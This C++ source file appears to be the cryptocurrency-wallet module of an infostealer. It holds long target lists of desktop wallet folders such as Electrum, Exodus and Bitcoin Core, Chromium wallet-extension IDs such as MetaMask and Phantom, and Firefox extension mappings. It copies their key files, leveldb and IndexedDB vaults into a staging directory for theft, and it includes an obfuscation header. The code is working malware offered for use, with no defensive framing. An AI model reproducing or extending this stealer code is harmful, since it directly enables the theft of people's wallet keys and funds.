// Crypto wallet collection: desktop wallets (files/keys), browser wallet
// extensions (leveldb/indexeddb vaults), Firefox extension storage mapping.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include <sstream>

namespace {

struct WalletTarget { const char* name; const char* path; const char* pattern; };

// desktop wallets — {name, %env%\relpath, file pattern}
const WalletTarget k_wallets[] = {
    {"Armory", "%APPDATA%\\Armory", "*"},
    {"Atomic", "%APPDATA%\\atomic", "*"},
    {"Binance", "%APPDATA%\\Binance", "*"},
    {"Bitcoin Core", "%APPDATA%\\Bitcoin", "*"},
    {"BitPay", "%APPDATA%\\BitPay", "*"},
    {"Bither", "%APPDATA%\\Bither", "*"},
    {"Blockstream", "%APPDATA%\\Blockstream", "*"},
    {"Bytecoin", "%APPDATA%\\bytecoin", "*"},
    {"Coinomi", "%LOCALAPPDATA%\\Coinomi\\Coinomi\\wallets", "*"},
    {"Dash Core", "%APPDATA%\\DashCore", "*"},
    {"Dogecoin Core", "%APPDATA%\\Dogecoin", "*"},
    {"Electrum", "%APPDATA%\\Electrum\\wallets", "*"},
    {"ElectronCash", "%APPDATA%\\ElectronCash", "*"},
    {"Ethereum", "%APPDATA%\\Ethereum\\keystore", "*"},
    {"Exodus", "%APPDATA%\\Exodus", "*"},
    {"Exodus (local)", "%LOCALAPPDATA%\\Exodus", "*"},
    {"Guarda", "%APPDATA%\\Guarda", "*"},
    {"Jaxx", "%APPDATA%\\Jaxx", "*"},
    {"Ledger Live", "%APPDATA%\\Ledger Live", "*"},
    {"Litecoin Core", "%APPDATA%\\Litecoin", "*"},
    {"Monero", "%APPDATA%\\Monero", "*"},
    {"Monero docs", "%USERPROFILE%\\Documents\\Monero", "*"},
    {"MultiBit", "%APPDATA%\\MultiBit", "*"},
    {"Trezor Suite", "%APPDATA%\\Trezor Suite", "*"},
    {"Wasabi", "%APPDATA%\\WalletWasabi\\Client", "*"},
    {"Zcash", "%APPDATA%\\Zcash", "*"},
    {"Daedalus", "%APPDATA%\\Daedalus", "*"},
    {"Yoroi", "%APPDATA%\\Yoroi", "*"},
    {"NanoWallet", "%APPDATA%\\NanoWallet", "*"},
    {"Godwoken", "%APPDATA%\\Godwoken", "*"},
    {"Bisq", "%APPDATA%\\Bisq", "*"},
    {"RaiWallet", "%APPDATA%\\RaiWallet", "*"},
    {"Vertcoin", "%APPDATA%\\Vertcoin", "*"},
    {"Neo", "%APPDATA%\\Neo", "*"},
    {"Nexus", "%APPDATA%\\Nexus", "*"},
    {"SolarWallet", "%APPDATA%\\SolarWallet", "*"},
    {"Raven", "%APPDATA%\\Raven", "*"},
    {"PIVX", "%APPDATA%\\PIVX", "*"},
    {"BitcoinABC", "%APPDATA%\\BitcoinABC", "*"},
    {"LitecoinCore", "%APPDATA%\\LitecoinCore", "*"},
    {"Tron", "%APPDATA%\\Tron", "*"},
    {"Zelcash", "%APPDATA%\\Zelcash", "*"},
    {"Zap", "%APPDATA%\\Zap", "*"},
    {"Grin", "%APPDATA%\\Grin", "*"},
    {"Komodo", "%APPDATA%\\Komodo", "*"},
    {"Beam", "%APPDATA%\\Beam", "*"},
    {"Stratis", "%APPDATA%\\Stratis", "*"},
    {"Geth", "%APPDATA%\\Geth", "*"},
    {"WalletWasabi", "%APPDATA%\\WalletWasabi", "*"},
    {"Phantom", "%APPDATA%\\Phantom", "*"},
    {"Solflare", "%APPDATA%\\Solflare", "*"},
    {"Nault", "%APPDATA%\\Nault", "*"},
    {"Keplr", "%APPDATA%\\Keplr", "*"},
    {"Coinbase Wallet", "%APPDATA%\\Coinbase Wallet", "*"},
    {"MetaMask (desktop)", "%APPDATA%\\MetaMask", "*"},
    {"Trust Wallet", "%APPDATA%\\Trust Wallet", "*"},
    {"Tonkeeper", "%APPDATA%\\Tonkeeper", "*"},
    {"Telegram Ton", "%APPDATA%\\Ton", "*"},
    {"Bytecoin2", "%APPDATA%\\Bytecoin", "*"},
    {"Bytecoin docs", "%USERPROFILE%\\Documents\\Bytecoin", "*"},
    {"BitShares", "%APPDATA%\\BitShares", "*"},
    {"Copay", "%APPDATA%\\Copay", "*"},
    {"Ecoinomi", "%APPDATA%\\Electrum-LTC", "*"},
    {"ElectrumLTC", "%APPDATA%\\Electrum-LTC", "*"},
    {"Exodus NoRoaming", "%LOCALAPPDATA%\\Programs\\Exodus", "*"},
    // wallet-ish common filenames outside standard dirs
    {"wallet.dat profile", "%USERPROFILE%", "wallet.dat"},
    {"keystore profile", "%USERPROFILE%\\keystore", "*"},
};

// browser wallet extensions — Chromium extension IDs
struct ExtTarget { const char* id; const char* name; };
const ExtTarget k_exts[] = {
    {"nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask"},
    {"ejbalbakoplchlghecdalmeeeajnimhm", "MetaMask (beta)"},
    {"fhbohimaelbohpjbbldcngcnapndodjp", "Binance Chain Wallet"},
    {"ibnejdfjmmkpcnlpebklmnkoeoihofec", "TronLink"},
    {"bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"},
    {"hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase Wallet"},
    {"aejcldbhfahovpjphlbonbohdnccmoio", "Coin98"},
    {"dmkamcknogkgcdfhhbddcghachkejeap", "Keplr"},
    {"fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin"},
    {"bhhhlbepdkbapadjdnnojkbgioiodbic", "Solflare"},
    {"mfgccjchihfkkindfppnaooecgfneiii", "TokenPocket"},
    {"afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math Wallet"},
    {"jnmbobjmhlngoefaiojfljckilhhlhcj", "OneKey"},
    {"hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI"},
    {"aiifbnbfobpmeekipheeijimdpnlpfug", "Terra Station"},
    {"dmkamcknogkgcdfhhbddcghachkejeap", "Cosmos"},
    {"ejjladinnckdgjemekebdpeokbikhfci", "Petra"},
    {"efbglgofoippbgcjepnhiblaibcnclgk", "Martian"},
    {"cjnkdapkflcinenbaidaiohjpmlfonep", "Braavos"},
    {"fiikommddbeccaoicoejoniammnalkfa", "Nightly"},
    {"akkmdhkkdmakmakahndfdjelbbpokcip", "Zecrey"},
    {"fijngjgcjhjmmpcmkeiomlglpeiijkld", "Talisman"},
    {"flpiciilemghbmfalicajoolhkkenfel", "ICONex"},
    {"acmacodkjbdgmoleebolmdjonilkdbch", "Rabby"},
    {"pdadjkfkgcafgbceimcpbkalnfnepajp", "Aptos"},
    {"ogoennnlilbpinjlonbhkbfpfngdnngb", "KardiaChain"},
    {"feaccnblajjbfpgacipaafgemdagjjil", "Coinbase beta"},
    {"nphplpgoakhhjchkkhmiggakijnkhfnd", "Temple"},
    {"onhogfjeacnfoofkfgppdlbmlmnplgbn", "SubWallet"},
    {"mcohilncbfahbmgdjkbpemcciiolgcge", "OKX Wallet"},
    {"ppbibelpcjmhbdihakflkdcoccbgbkpo", "Unisat"},
    {"idnnbdplmphpflfnlkomgpfbpcgelopg", "Xverse"},
    {"hcmehenccjdmfbojapcbcofkgdpbnlle", "Fordefi"},
    {"opfgelmcmbiajamepnmloijbpoleiama", "Rainbow"},
    {"ldcoohedfbjoobcadoglnnmmfbdlmmhf", "Frame Companion"},
    {"klghhnkeealcohjjanjjdaeeggmfmlpl", "Zerion"},
    {"hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"},
    {"lgmpcpglpngdoalbgeoldeajfclnhafa", "SafePal"},
    {"pnlfjmlcjdjgkddecgincndfgegkecke", "Leap"},
    {"kcacophmkddoclbkkomooihmoepjkgli", "Torus"},
    {"ppnbnpeolgkicgegkbkbjmhlideopiji", "Atomex"},
    {"jiidiaalihmmhddjgbnbgdfflelocpak", "Bitget"},
    {"lpnfglhjcbikgbdgdhmhcidabjnfedjf", "Lobstr"},
    {"dijllmpogbfbkgbabkcphembgncnnfjh", "Klever"},
    {"opcgpfmipidbgpenhmajoajpbobppdil", "Slush (Sui)"},
    {"aflkmfhebedbjioipglgcbcmnbpgliof", "Backpack"},
};

// chrome-family extension storage locations per browser root
void collect_extensions_for(const std::string& browser_name, const std::string& user_data,
                            const std::string& staging, std::ostringstream& summary) {
    if (!util::is_dir(user_data)) return;
    for (auto& prof : util::list_subdirs(user_data)) {
        std::string pname = util::filename_of(prof);
        std::string lower = util::to_lower(pname);
        if (!(lower == "default" || util::starts_with(lower, "profile") || lower == "guest profile"))
            continue;
        for (auto& ext : k_exts) {
            std::string ext_dir = util::join(prof, std::string("Local Extension Settings\\") + ext.id);
            std::string idx_dir = util::join(prof, std::string("IndexedDB\\chrome-extension_") + ext.id + "_0.indexeddb.leveldb");
            std::string dest_base = browser_name + "_" + pname + "_" + ext.name;
            if (util::is_dir(ext_dir)) {
                util::copy_dir_recursive(ext_dir, util::join(staging, "wallets\\ext\\" + dest_base), {"*.ldb", "*.log", "*.json"}, 64 * 1024 * 1024);
                summary << "  " << browser_name << "/" << pname << ": " << ext.name << " (local settings)\r\n";
            }
            if (util::is_dir(idx_dir)) {
                util::copy_dir_recursive(idx_dir, util::join(staging, "wallets\\ext\\" + dest_base + "_idb"), {}, 64 * 1024 * 1024);
                summary << "  " << browser_name << "/" << pname << ": " << ext.name << " (indexeddb)\r\n";
            }
        }
    }
}

// Firefox extension storage: map known extension UUIDs from prefs.js
void collect_firefox_extensions(const std::string& profile_dir, const std::string& staging,
                                std::ostringstream& summary) {
    static const std::vector<std::pair<std::string, std::string>> fx_exts = {
        {"webextension@metamask.io", "MetaMask"},
        {"@phantom", "Phantom"},
        {"keplr-extension@keplr.app", "Keplr"},
        {"@templewallet", "Temple"},
        {"@octo-wallet", "Octo"},
        {"@subwallet", "SubWallet"},
        {"@polkadot-js-extension", "Polkadot.js"},
        {"@liquality", "Liquality"},
        {"@ronin-extension", "Ronin"},
        {"@talisman", "Talisman"},
    };
    std::vector<uint8_t> prefs_raw;
    if (!util::read_file(util::join(profile_dir, "prefs.js"), prefs_raw)) return;
    std::string prefs(prefs_raw.begin(), prefs_raw.end());
    size_t pos = prefs.find("extensions.webextensions.uuids");
    if (pos == std::string::npos) return;
    size_t end = prefs.find("');", pos);
    if (end == std::string::npos) end = prefs.find("\");", pos);
    if (end == std::string::npos) end = prefs.size();
    std::string chunk = prefs.substr(pos, end - pos);

    for (auto& [ext_id, name] : fx_exts) {
        size_t epos = chunk.find(ext_id);
        if (epos == std::string::npos) continue;
        // uuid appears as "<ext_id>":"<uuid>"
        size_t q = chunk.find('"', epos + ext_id.size() + 2);
        size_t q2 = chunk.find('"', q + 1);
        if (q == std::string::npos || q2 == std::string::npos) continue;
        std::string uuid = chunk.substr(q + 1, q2 - q - 1);
        std::string store = util::join(profile_dir, "storage\\default\\moz-extension+++" + uuid);
        if (util::is_dir(store)) {
            util::copy_dir_recursive(store, util::join(staging, "wallets\\ext\\ff_" + name), {}, 64 * 1024 * 1024);
            summary << "  Firefox: " << name << " storage collected\r\n";
        }
    }
}

} // namespace

namespace mod {

void wallets(const std::string& staging) {
    std::ostringstream summary;
    int hits = 0;

    // ---- desktop wallets ----
    for (auto& w : k_wallets) {
        std::string path = util::expand_env(w.path);
        if (path.empty() || !util::path_exists(path)) continue;
        hits++;
        if (util::is_dir(path)) {
            std::string dest = util::join(staging, "wallets\\" + std::string(w.name));
            util::copy_dir_recursive(path, dest, {w.pattern}, 64 * 1024 * 1024);
            summary << "  " << w.name << ": " << path << "\r\n";
        } else {
            std::vector<uint8_t> data;
            if (util::read_file(path, data) && data.size() < cfg::MAX_GRAB_FILE) {
                stage::stage_bytes("wallets", std::string(w.name) + "_" + util::filename_of(path), data);
                summary << "  " << w.name << ": " << path << " (file)\r\n";
            }
        }
    }

    // ---- browser extension wallets ----
    std::string local = util::expand_env("%LOCALAPPDATA%");
    std::string roaming = util::expand_env("%APPDATA%");
    struct { const char* name; const char* root; } chrome_roots[] = {
        {"Chrome", "\\Google\\Chrome\\User Data"},
        {"Chrome Canary", "\\Google\\Chrome SxS\\User Data"},
        {"Edge", "\\Microsoft\\Edge\\User Data"},
        {"Brave", "\\BraveSoftware\\Brave-Browser\\User Data"},
        {"Vivaldi", "\\Vivaldi\\User Data"},
        {"Yandex", "\\Yandex\\YandexBrowser\\User Data"},
        {"Chromium", "\\Chromium\\User Data"},
        {"Opera", ""}, // handled separately (roaming)
    };
    for (auto& cr : chrome_roots) {
        if (std::string(cr.name) == "Opera") {
            collect_extensions_for("Opera", util::join(roaming, "Opera Software\\Opera Stable"), staging, summary);
            collect_extensions_for("Opera GX", util::join(roaming, "Opera Software\\Opera GX Stable"), staging, summary);
        } else {
            collect_extensions_for(cr.name, local + cr.root, staging, summary);
        }
    }

    // ---- Firefox family extension storage ----
    std::string fx = util::join(roaming, "Mozilla\\Firefox\\Profiles");
    if (util::is_dir(fx)) {
        for (auto& prof : util::list_subdirs(fx))
            collect_firefox_extensions(prof, staging, summary);
    }

    stage::stage_text("wallets", "_summary.txt", summary.str());
    stage::note("wallets", std::to_string(hits) + " desktop wallets found");
}

} // namespace mod
